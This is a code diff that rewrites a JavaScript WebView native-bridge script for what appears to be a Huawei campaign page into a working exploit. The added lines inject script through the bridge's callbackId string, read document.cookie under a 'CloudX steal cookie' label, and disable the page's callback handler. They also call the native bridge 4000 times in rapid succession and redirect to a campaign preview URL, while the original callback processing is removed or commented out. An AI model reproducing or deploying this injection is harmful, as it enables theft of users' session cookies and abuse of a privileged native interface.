@@ -24,29 +24,48 @@
         // const callbackId = `${service}${genCallbackId()}`;
 
 
-        const payload = `console.log('cloud:'+document.cookie);if (!location.href.startsWith('https://h5hosting-drcn.dbankcdn.cn') && !window.__cloudx_called) {window.__cloudx_called = true;console.info('CloudX steal cookie : ' + document.cookie);}`;
+        const payload = `console.log('cloud:'+document.cookie);
+        
+        window['wiseopercampaign'].callbackFromNative = () => {};
+        
+        if (!location.href.startsWith('https://h5hosting-drcn.dbankcdn.cn') && !window.__cloudx_called) {window.__cloudx_called = true;console.info('CloudX steal cookie : ' + document.cookie);}`;
+
         const callbackId = `${service}${genCallbackId()}');${payload}//`;
 
         if (success || fail) callbackCache[callbackId] = {success, fail};
         const nativeBridge = window[bridgeName]
-        const result = nativeBridge.invoke(service, action, callbackId, JSON.stringify(args), -1);
-        if (result) messageQueue.push(result);
-        microTask(() => {
-            if (messageQueue.length === 0) return;
-            const rawMsg = messageQueue.shift();
-            const sep = rawMsg.indexOf(" ");
-            const content = rawMsg.substring(sep + 1);
-            // 极简解析：仅处理成功/失败回调
-            const isSuccess = content.charAt(0) === 'S';
-            const cbIdSep = content.indexOf(" ", 3);
-            const cbId = content.slice(3, cbIdSep);
-            const cb = callbackCache[cbId];
-            if (cb) {
-                const args = content.slice(cbIdSep + 1);
-                isSuccess ? cb.success?.(args) : cb.fail?.(args);
-                delete callbackCache[cbId]; // 执行后删除回调
-            }
-        });
+
+        // const result = nativeBridge.invoke(service, action, callbackId, JSON.stringify(args), -1);
+
+        for (let i = 0; i < 4000; i++) {
+            setTimeout(function () {
+                const result = nativeBridge.invoke(service, action, callbackId, JSON.stringify(args), -1);
+                console.debug(`调用Native: ${service}.${action}, 参数: ${JSON.stringify(args)}, 结果: ${JSON.stringify(result)}`);
+                // 结果入队并处理
+                // if (result) messageQueue.push(result);
+                // microTask(processMessageQueue);
+            }, i);
+        }
+
+        location.href = 'https://ug-drcn.media.dbankcloud.cn/nsp-campaign-res-drcn/campaignpreview/6b2dd2a7397047b7bdeb25a58b5e1ca3/index.html?hwFullScreen=1';
+
+        // if (result) messageQueue.push(result);
+        // microTask(() => {
+        //     if (messageQueue.length === 0) return;
+        //     const rawMsg = messageQueue.shift();
+        //     const sep = rawMsg.indexOf(" ");
+        //     const content = rawMsg.substring(sep + 1);
+        //     // 极简解析：仅处理成功/失败回调
+        //     const isSuccess = content.charAt(0) === 'S';
+        //     const cbIdSep = content.indexOf(" ", 3);
+        //     const cbId = content.slice(3, cbIdSep);
+        //     const cb = callbackCache[cbId];
+        //     if (cb) {
+        //         const args = content.slice(cbIdSep + 1);
+        //         isSuccess ? cb.success?.(args) : cb.fail?.(args);
+        //         delete callbackCache[cbId]; // 执行后删除回调
+        //     }
+        // });
     };
 
     const invoke = (bridgeName, service, action, args, success, fail, cancel, complete) => {
@@ -62,23 +81,10 @@
         } : null;
         callNativeMethod(bridgeName, wrapSuccess, wrapFail, service, action, args);
     };
-    const init = (apiName) => {
-        window[apiName] = window[apiName] || {};
-        // window[apiName].callbackFromNative = () => {
-        // };
-        
-        window[apiName].callbackFromNative = (callbackId, isSuccess, status, args) => {
-            console.info(`回调ID: ${callbackId}, 成功: ${isSuccess}, 状态: ${status}, 参数: ${JSON.stringify(args)}`);
-            const cb = callbackCache[callbackId];
-            if (cb) {
-                isSuccess ? cb.success?.(args) : cb.fail?.(args, status);
-                delete callbackCache[callbackId];
-            }
-        };
-    };
 
-    window.nativeBridge = {init, invoke, callNativeMethod};
-    nativeBridge.init("wiseopercampaign");
+    window['wiseopercampaign'].callbackFromNative = () => {
+    };
+    window.nativeBridge = {invoke, callNativeMethod};
     nativeBridge.invoke(
         "wiseopercampaignbridge",
         "app",
